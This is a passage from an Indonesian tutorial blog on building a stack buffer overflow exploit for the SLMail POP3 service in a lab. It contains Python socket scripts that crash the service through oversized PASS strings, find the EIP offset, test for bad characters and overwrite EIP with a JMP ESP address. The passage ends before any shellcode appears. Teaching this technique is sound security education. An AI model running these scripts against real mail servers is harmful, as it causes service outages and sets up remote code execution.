pattern_password="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9A$


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      #definisikan koneksi TCP/IP soket

print "\nBerkomunikasi dengan POP3.....\n"
connect=s.connect(('172.16.192.130',110))       #Koneksi ke POP3 server
data=s.recv(1024)                               #pesan balasan dari 
server
print data                                      #print ke layar supaya 
kita tau statusnya

s.send('USER adinanta\r\n')                     #kirim username adinanta
 (username apa aja bisa)
data=s.recv(1024)                               #pesat balasan server
s.send('PASS '+pattern_password+'\r\n')                 #kirim string 
password ke server
s.send('QUIT\r\n')                              #keluar dari komunikasi 
pop3
s.close()                                       #putus tcp/ip connection</code></pre></figure>

<p>2.Melihat karakter yang tersimpan di register EIP menggunakan debugger saat POP3 crash (hang)</p>

<p>Sebelum melihat nilai di register EIP, pastikan layanan SLMAIL POP3 
telah crash (hang) dengan memperhatikan pesan di window kiri bawah yang 
bertulisan “Access Violation when executing [XXXXXX).</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/nilai-eip-saat-crash.png" class="align-center" alt="install gpg"></p>

<p>3.Mencari posisi karakter yang kita temukan di register EIP dalam 
karakter sepanjang 3100 byte menggunakan 
/usr/share/metasploit-framework/tools/pattern_offset.rb. Di komputer 
saya, register EIP menyimpan nilai 0x39694438 dan berada di karakter 
2606 dari 3100 byte yang kita kirim.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/eip-offset.png" class="align-center" alt="install gpg"></p>

<p>4.Memastikan bahwa EIP memang ter-overwrite oleh karakter yang berada
 di hitungan 2606. Kita akan modifikasi script sebelumnya dan mengganti 4
 karakter di posisi 2606 dengan karakter “A” dan kemudian sisa nya diisi
 kembali dengan karakter “C”. Berikut script yang akan kita gunakan</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">password_awal</span><span class="o">=</span><span class="s">"C"</span><span class="o">*</span><span class="mi">2606</span> <span class="c">#buat karakter c sebanyak 2606</span>
<span class="n">eip</span><span class="o">=</span><span class="s">"AAAA"</span> <span class="c">#buat karakter A sebanyak 4</span>
<span class="n">password_akhir</span><span class="o">=</span><span class="s">"C"</span><span class="o">*</span><span class="mi">490</span> <span class="c">#dilanjutkan dengan c sebanyak 3100-4-2606=490</span>


<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>	<span class="c">#definisikan koneksi TCP/IP soket</span>

<span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">Berkomunikasi dengan POP3.....</span><span class="se">\n</span><span class="s">"</span>
<span class="n">connect</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'172.16.192.130'</span><span class="p">,</span><span class="mi">110</span><span class="p">))</span>		<span class="c">#Koneksi ke POP3 server</span>
<span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>					<span class="c">#pesan balasan dari server</span>
<span class="k">print</span> <span class="n">data</span>						<span class="c">#print ke layar supaya kita tau statusnya</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'USER adinanta</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>				<span class="c">#kirim username adinanta (username apa aja bisa)</span>
<span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>					<span class="c">#pesat balasan server</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'PASS '</span><span class="o">+</span><span class="n">password_awal</span><span class="o">+</span><span class="n">eip</span><span class="o">+</span><span class="n">password_akhir</span><span class="o">+</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>	<span class="c">#kirim string password ke server</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'QUIT</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>					<span class="c">#keluar dari komunikasi pop3</span>
<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>						<span class="c">#putus tcp/ip connection</span></code></pre></figure>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/confirm-eip-position.png" class="align-center" alt="install gpg"></p>

<p>Setelah script dijalankan, ktia dapat melihat bahwa nilai EIP diisi 
dengan 4 karakter ASCII “A” atau dalam HEX \x41\x41\x41\x41 (41414141) 
dan kemudian isi STACK dipenuhi dengan karakter ASCII “C” atau dalam HEX
 \x43\x43\x43\x43. Dengan fakta ini, dapat disimpulkan bahwa nilai EIP 
telah ditimpa (overwrite) oleh 4 karakter yang berlokasi mulai dari 
2606.</p>

<p>Seperti pembahasan sebelumnya, kapasitas register di processor x86 
adalah 32-bit atau 4-byte. Setiap karakter ASCII membutuhkan ruang 
sebesar 1 byte atau 8 bit karena setiap karakter dinyatakan dalam dua 
digit HEX.</p>

<p>Dengan mengetahui lokasi yang tepat untuk menimpa nilai EIP, kita 
sudah bisa mengkontrol alur proses eksekusi CPU. Hal ini yang akan kita 
manfaatkan selanjutnya untuk mengambil alih Sistem Operasi yang 
menjalankan SLMAIL.</p>

<p>Berikut video singkat yang menjelaskan proses diatas. Agar text di 
video terbaca, gunakan HD di setting video yang tersedia di menu 
youtube.</p>

<div style="text-align:center">
  <iframe src="https://www.youtube.com/embed/c7DdqzsprM0" allowfullscreen="" width="640" height="480" frameborder="0"></iframe>
</div>

<h3 id="mengeksploitasi-kerentanan-buffer-overflow-">Mengeksploitasi kerentanan Buffer Overflow <a name="exploit-buffer-overflow"></a></h3>

<p>Singkat kata, kita akan memanfaatkan situasi dimana alur proses 
eksekusi CPU dapat dikontrol dan diubah dengan menimpa nilai EIP. Pada 
bagian ini, kita akan upload program shell bersamaan dengan pengiriman 
password dan kemudian memerintahkan CPU untuk mengeksekusinya. Program 
shell adalah program sederhana yang dapat memberikan kita akses ke 
command prompt sistem operasi.</p>

<p>Berikut langkah yang akan kita lakukan:</p>

<p><span style="color:red"><strong>i. Mencari ruang memory yang dapat kita manfaatkan untuk menyimpan program shell (shell code) yang kita upload</strong>.</span></p>

<p>Sebelum kita menginstruksikan CPU untuk mengeksekusi program shell, 
kita harus terlebih dahulu mengetahui dimana kita bisa menyimpan program
 ini di memory. Program shell (shell code) dapat diupload ke memory 
melalui proses pengiriman password dengan mengganti karakter “C” dengan 
program shell yang sudah di compile.</p>

<p>Saat kita memvalidasi lokasi EIP yang tertimpa sebelumnya, kita 
sekilas melihat bahwa register ESP (Extended STACK Pointer) menunjukan 
lokasi memory yang menyimpan karakter “C”. Kita belum mengetahui apakah 
karakter “C” ini berasal dari jumlah karakter sebelum EIP tertimpa atau 
setelahnya. Berikut ini bagian dari karakter yang kita kirim sebelumnya</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">password_awal</span><span class="o">=</span><span class="s">"C"</span><span class="o">*</span><span class="mi">2606</span> <span class="c">#buat karakter c sebanyak 2606</span>
<span class="n">eip</span><span class="o">=</span><span class="s">"AAAA"</span> <span class="c">#buat karakter A sebanyak 4</span>
<span class="n">password_akhir</span><span class="o">=</span><span class="s">"C"</span><span class="o">*</span><span class="mi">490</span> <span class="c">#dilanjutkan dengan c sebanyak 3100-4-2606=490</span></code></pre></figure>

<p>Untuk memastikan ini, kita akan ubah variable “password_akhir” dengan
 karakter “B” dan kemudian melihat kembali isi memory STACK yang 
direferensikan oleh register ESP. Berikut hasilnya.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/space-for-payload.png" class="align-center" alt="install gpg"></p>

<p>Terlihat bahwa register ESP menunjuk (pointing) ke lokasi memory 
STACK yang menyimpan karakter “B” atau \x42. Artinya, memory STACK 
menyimpan karakter yang kita kirim melalui variable “password_akhir”. 
Lokasi ini bisa menjadi tempat yang potensial untuk menyimpan program 
shell (shell code) kita karena kita dapat dengan mudah menginstruksikan 
CPU untuk mengeksekusi ini dengan memerintahkannya untuk melakukan 
“JUMP” ke lokasi ESP. Perintah ini kita sampaikan ke CPU dengan mengisi 
register EIP dengan alamat memory yang menyimpan instruksi “jmp ESP”.</p>

<p>Sebelum memutuskan untuk menggunakan lokasi ini, mari kita terlebih dahulu memastikan hal berikut:</p>

<p>a. Ukuran memory yang disediakan STACK cukup untuk menyimpan program 
shell (shell code) kita. Ukuran yang kita butuhkan sekitar 500 byte.
b. Awal lokasi STACK menyimpan karakter pertama dari program shell 
(shell code) kita karena kita tidak ingin awal program kita terpotong 
sehingga tidak dapat dieksekusi oleh CPU.</p>

<p>Untuk memastikan hal diatas, kita akan kembali mengirim karakter 
password dimana variable “password_akhir” akan kita tentukan dengan 
karakter unik sepanjang 500 byte. Berikut modifikasi nilai variable 
“password_akhir”.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">password_awal</span><span class="o">=</span><span class="s">"C"</span><span class="o">*</span><span class="mi">2606</span> <span class="c">#buat karakter c sebanyak 2606</span>

<span class="n">eip</span><span class="o">=</span><span class="s">"AAAA"</span> <span class="c">#buat karakter A sebanyak 4</span>

<span class="n">password_akhir</span><span class="o">=</span><span class="p">(</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab"</span><span class="o">+</span>
<span class="s">"4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3A"</span><span class="o">+</span>
<span class="s">"d4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3A"</span><span class="o">+</span>
<span class="s">"f4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah"</span><span class="o">+</span>
<span class="s">"4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4A"</span><span class="o">+</span>
<span class="s">"j5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al"</span><span class="o">+</span>
<span class="s">"6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7"</span><span class="o">+</span>
<span class="s">"An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"</span><span class="p">)</span></code></pre></figure>

<p>Berikut nilai ESP setelah karakter diatas berhasil dikirim ke layanan SLMAIL POP3.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/ukuran-stack.png" class="align-center" alt="install gpg"></p>

<p>Dari hasil diatas, terlihat bahwa awal karakter (AaoA) yang berasal 
dari variable “password_akhir” telah tersimpan dengan baik di lokasi 
awal memory STACK. Artinya tidak ada pemotongan pada karakter awal saat 
proses buffer overflow terjadi sehingga lokasi memory ini aman digunakan
 untuk menyimpan program shell kita.</p>

<p>Namun demikian, kita mendeteksi adanya pemotongan beberapa karakter 
dipertengahan. Hal ini bisa dilihat dari ukuran karakter unik yang 
tersimpan di memory STACK yaitu sebesar 416 byte dan bukan 500 byte 
seperti yang kita harapkan. Ini bukanlah kondisi yang ideal karena 
program shell yang terpotong tidak akan berhasil dieksekusi.</p>

<p>Pemotongan karaker ini bisa disebabkan oleh adanya “Bad Character” di
 sekumpulan karakter unik yang kita kirim. “Bad character” adalah 
karakter yang tidak dapat diterima sebagai input oleh aplikasi. 
Misalnya, karakter “null” tidak diperbolehkan menjadi bagian dari 
password di SLMAIL POP3. Begitu juga dengan karakter “enter” atau 
“cariage return” dimana SLMAIL POP3 menggunakan karakter ini sebagai 
signal berakhirnya input dari user sehingga karakter apapun yang muncul 
setelah ini tidak akan diproses.</p>

<p>Setiap aplikasi memiliki aturan tersendiri tentang karakter apa saja 
yang dapat diterima untuk diproses sehingga analisis terhadap prilaku 
aplikasi perlu dilakukan sebelum mengirim program shell atau kode 
eksploitasi.</p>

<p>Berikut video singkat yang menjelaskan proses diatas. Agar text di 
video terbaca, gunakan HD di setting video yang tersedia di menu 
youtube.</p>

<div style="text-align:center">
  <iframe src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/Ja9beGaqXmQ.html" allowfullscreen="" width="640" height="480" frameborder="0"></iframe>
</div>

<p><span style="color:red"><strong>ii.Mengidentifikasi “Bad Character”</strong></span></p>

<p>Untuk mengetahui karakter apa saja yang dianggap “bad character” oleh
 SLMAIL POP3, kita akan mengirim password dengan karakter yang dimulai 
dari HEX \x00 sampai ke HEX \xFF. Tentu pengiriman ini akan dilakukan 
melalui variable “password_akhir” karena kita tahu bahwa isi variable 
ini akan tersimpan di awal STACK setelah buffer overflow terjadi.</p>

<p>Seperti yang kita ketahui, karakter ASCII dapat dinyatakan dalam HEX 
mulai dari \x00 sampai ke \xFF. Daftar ASCII berikut dengan padanan HEX 
nya dapat dilihat di <a href="http://www.ascii-code.com/">http://www.ascii-code.com</a>.</p>

<p>Kenapa kita mengirimnya dalam format HEX? karena program shell yang 
akan kita upload melalui pengiriman password tidak semua nya terdiri 
dari karakter ASCII yang printable. Artinya, program tersebut tidak 
semuanya disusun menggunakan karakter “A-Z”, huruf “0-9” atau karakter 
lainnya yang bisa kita nyatakan dengan bahasa kita.</p>

<p>Sebagai contoh, program shell mungkin memiliki beberapa karakter 
ASCII “C’ atau dalam HEX \x43 yang tentunya dapat kita nyatakan dalam 
bahasa kita. Namun bisa saja susunan program shell memiliki karakter 
berjenis kontrol seperti “Line feed” yang hanya dapat dinyatakan dalam 
HEX yaitu \x0A.</p>

<p>Cara sederhana untuk mengidentifikasi bad character adalah dengan 
melihat keseluruhan isi STACK yang ditunjuk oleh register ESP saat 
pengiriman bad character selesai dan SLMAIL POP3 crash (hang). Karakter 
yang tidak tersimpan di STACK adalah karakter yang diabaikan oleh 
aplikasi dan oleh karenanya merupakan bad character.</p>

<p>Berikut script yang kita jalankan untuk mengidentifikasi bad character</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">password_awal</span><span class="o">=</span><span class="s">"C"</span><span class="o">*</span><span class="mi">2606</span> <span class="c">#buat karakter c sebanyak 2606</span>
<span class="n">eip</span><span class="o">=</span><span class="s">"AAAA"</span> <span class="c">#buat karakter A sebanyak 4</span>
<span class="n">password_akhir</span><span class="o">=</span><span class="p">(</span><span class="s">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span class="s">"</span><span class="o">+</span>
<span class="s">"</span><span class="se">\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"</span><span class="p">)</span>



<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>	<span class="c">#definisikan koneksi TCP/IP soket</span>

<span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">Berkomunikasi dengan POP3.....</span><span class="se">\n</span><span class="s">"</span>
<span class="n">connect</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'172.16.192.130'</span><span class="p">,</span><span class="mi">110</span><span class="p">))</span>		<span class="c">#Koneksi ke POP3 server</span>
<span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>					<span class="c">#pesan balasan dari server</span>
<span class="k">print</span> <span class="n">data</span>						<span class="c">#print ke layar supaya kita tau statusnya</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'USER adinanta</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>				<span class="c">#kirim username adinanta (username apa aja bisa)</span>
<span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>					<span class="c">#pesat balasan server</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'PASS '</span><span class="o">+</span><span class="n">password_awal</span><span class="o">+</span><span class="n">eip</span><span class="o">+</span><span class="n">password_akhir</span><span class="o">+</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>	<span class="c">#kirim string password ke server</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'QUIT</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>					<span class="c">#keluar dari komunikasi pop3</span>
<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>						<span class="c">#putus tcp/ip connection</span></code></pre></figure>

<p>Dari pengiriman semua kombinasi ASCII diatas, diketahui bahwa 
karakter \x0A tidak tersimpan dalam STACK. Hal ini tidak mengherankan 
karena karakter HEX \x0A adalah “line feed” yang artinya sebuah signal 
untuk memulai baris baru. Tentu ini tidak boleh menjadi bagian dari 
password yang kita kirim ke SLMAIL POP3. Berikut ini isi memory yang 
ditunjuk oleh ESP</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/bad-char.png" class="align-center" alt="install gpg"></p>

<p>Untuk mengidentifikasi bad character lainnya, kita kirim kembali 
semua kombinasi ASCII kecuali karakter \x0A. Setelah itu, analisa isi 
memory STACK dan cari karakter mana saja yang dikirim namun tidak 
tersimpan. Lakukan proses ini berulang kali sampai kita mengetahui 
secara pasti karakter mana saja yang dianggap bad character oleh 
aplikasi.</p>

<p>Perlu diingat bahwa service/layanan SLMAIL POP3 perlu direstart dan 
kemudian diattach kembali ke immunity debugger setiap melakukan proses 
diatas karena setiap pengiriman password dengan panjang 3100 byte akan 
menyebabkan layanan tersebut crash (hang).</p>

<p>Setelah proses diatas selesai, dapat diketahui bahwa bad character 
atau karakter yang harus dihindari oleh program shell kita adalah <span style="color:red"><strong>“\x00, \x0A, \x0D”</strong></span></p>

<p>Berikut video singkat yang menjelaskan proses diatas. Agar text di 
video terbaca, gunakan HD di setting video yang tersedia di menu 
youtube.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/youtube-hd.png" class="align-center" alt="install gpg"></p>

<div style="text-align:center">
  <iframe src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/D5P8soUClCg.html" allowfullscreen="" width="640" height="480" frameborder="0"></iframe>
</div>

<p><span style="color:red"><strong>iii. Mencari instruksi “JMP ESP”</strong></span></p>

<p>Seperti yang sudah dibahas sebelumnya bahwa ruang memory yang 
ditunjuk oleh register ESP dapat dimanfaatkan untuk menyimpan program 
shell kita. Tentu pertanyaan berikutnya adalah “bagaimana kita 
menginstruksikan CPU untuk mengeksekusi program shell ini?”</p>

<p>Mengingat kembali pembahasan sebelumnya bahwa tugas register EIP 
adalah memberi CPU petunjuk lokasi instruksi yang harus dieksekusi 
selanjutnya. Menurut logika sederhana, program shell kita akan 
dieksekusi oleh CPU apabila nilai register EIP (Extended Instruction 
Pointer) diisi dengan lokasi memory yang menyimpan program tersebut.</p>

<p>Walau logika tersebut tidak salah,namun perlu diketahui bahwa 
menginstruksikan CPU untuk melompat atau “jumping” langsung ke lokasi 
memory tertentu tidak selalu berhasil karena beberapa faktor seperti 
adanya bad character dibagian alamat memory tersebut. Selain itu, setiap
 sistem operasi memiliki memory addressing yang berbeda sehingga program
 exploit yang akan kita buat ini belum tentu berjalan dengan baik di 
platform lain.</p>

<p>Untuk mengatasi keterbatasan ini, kita bisa memanfaatkan instruksi 
yang telah dimuat (load) ke memory untuk lompat (jump) ke lokasi memory 
yang menyimpan program shell kita. Instruksi-instruksi ini bisa berasal 
dari program SLMAIL maupun dari dynamic link library (dll) system 
operasi (OS).</p>

<p>Penggunaan instruksi yang berasal dari aplikasi yang akan 
diexploitasi lebih bisa dihandalkan daripada menggunakan instruksi yang 
berasal dari sistem operasi(OS). Alasannya adalah karena instruksi 
tersebut selalu ada dan siap dipanggil walapun program yang akan 
dieksploitasi berjalan di sistem operasi yang berbeda.</p>

<p>Singkat kata, kita akan mencari instruksi di memory yang dapat 
memerintahkan CPU untuk jump ke register ESP (JMP ESP). Kenapa register 
ESP? karena register ini diketahui menunjuk lokasi memory yang menyimpan
 program shell kita.</p>

<p>Berikut langkah yang akan kita lakukan:</p>

<p>1.Mengetahui perintah JMP ESP dalam bentuk instruction code menggunakan tools seperti nasm. Padanan JMP ESP adalah “\xFF\xE4”</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/jmp-esp.png" class="align-center" alt="install gpg"></p>

<p>2.Memanfaatkaan MONA immunity debugger untuk mengidentifikasi module potensial yang mungkin memiliki instruksi JMP ESP.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/mona-list-modules.png" class="align-center" alt="install gpg"></p>

<p>3.Mencari instruksi JMP ESP atau “\xFF\xE4” di module SLMFC.dll</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/mona-list-jmp-esp.png" class="align-center" alt="install gpg"></p>

<p>4.Mona menemukan instruksi JMP ESP di alamat memory \x5F4A358F yang 
mungkin bisa kita manfaatkan. Untuk meyakini temuan ini, kita perlu 
melakukan pengujian dengan memasang “break point” di lokasi memory 
tersebut menggunakan immunity debugger dan kemudian menjalankan kembali 
script dimana nilai EIP ditimpa dengan alamat ini. Setelah itu, gunakan 
fungsi “step into” di immunity debugger untuk melihat apakah EIP 
kemudian berubah dan menunjuk ke lokasi memory yang ditunjuk oleh 
register ESP.</p>

<p>Berikut script yang akan kita jalankan dimana nilai EIP telah disesuaikan dengan alamat memory yang menyimpan instruksi JMP ESP.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">password_awal</span><span class="o">=</span><span class="s">"C"</span><span class="o">*</span><span class="mi">2606</span> <span class="c">#buat karakter c sebanyak 2606</span>
<span class="n">eip</span><span class="o">=</span><span class="s">"</span><span class="se">\x8F\x35\x4A\x5F</span><span class="s">"</span> <span class="c">#isi register EIP dengan alamat memory yang menyimpan instruksi JMP ESP</span>
<span class="n">password_akhir</span><span class="o">=</span><span class="s">"B"</span><span class="o">*</span><span class="mi">490</span> <span class="c">#dilanjutkan dengan c sebanyak 3100-4-2606=490</span>


<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>	<span class="c">#definisikan koneksi TCP/IP soket</span>

<span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">Berkomunikasi dengan POP3.....</span><span class="se">\n</span><span class="s">"</span>
<span class="n">connect</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'172.16.192.130'</span><span class="p">,</span><span class="mi">110</span><span class="p">))</span>		<span class="c">#Koneksi ke POP3 server</span>
<span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>					<span class="c">#pesan balasan dari server</span>
<span class="k">print</span> <span class="n">data</span>						<span class="c">#print ke layar supaya kita tau statusnya</span>

<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'USER adinanta</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>				<span class="c">#kirim username adinanta (username apa aja bisa)</span>
<span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>					<span class="c">#pesat balasan server</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'PASS '</span><span class="o">+</span><span class="n">password_awal</span><span class="o">+</span><span class="n">eip</span><span class="o">+</span><span class="n">password_akhir</span><span class="o">+</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>	<span class="c">#kirim string password ke server</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'QUIT</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>					<span class="c">#keluar dari komunikasi pop3</span>
<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>						<span class="c">#putus tcp/ip connection</span></code></pre></figure>

<p>Perlu diketahui bahwa alamat memory yang kita set di variable eip 
terbalik. Hal ini karena arsitektur processor kita menggunakan metode 
little endian.</p>

<p>Setelah script selesai dijalankan, kita bisa melihat immunity 
debugger berhenti di lokasi memory yang kita harapkan yaitu di 
\x5F4A358F</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/break-at-jmp-esp.png" class="align-center" alt="install gpg"></p>

<p>Perhatikan nilai ESP yang menunjuk ke lokasi memory \x01\x99\xA1\x54 
(0199A154) saat immunity debugger berhenti. Kita akan menekan tombol 
“step into” yang ada di toolbar atas untuk melanjutkan eksekusi 
instruksi berikutnya yaitu JMP ESP (\xFF\xE4). Berikut ini nilai EIP 
yang baru setelah eksekusi tersebut dijalankan.</p>

